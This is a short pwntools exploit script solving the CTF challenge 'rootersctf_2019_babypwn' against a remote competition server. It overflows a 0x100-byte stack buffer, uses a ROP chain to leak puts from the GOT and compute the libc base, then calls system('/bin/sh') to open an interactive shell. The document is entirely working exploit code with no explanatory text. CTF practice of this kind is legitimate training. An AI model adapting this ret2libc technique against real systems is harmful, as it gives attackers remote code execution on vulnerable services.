from pwn import *

#p = process('./rootersctf_2019_babypwn')
p = remote('node4.buuoj.cn', 25950)
elf = ELF('rootersctf_2019_babypwn')

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

main = elf.sym['main']

pop_rdi_ret = 0x401223
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = b'a' * ( 0x100 + 8 ) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
sla(b'back> ', payload)
libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
success('libc_base -> {}'.format(hex(libc_base)))

bin_sh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.sym['system']

payload = b'a' * ( 0x100 + 8 ) + p64(pop_rdi_ret + 1) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
sla(b'back> ', payload)

ru(b'a' * 0x108)

p.interactive()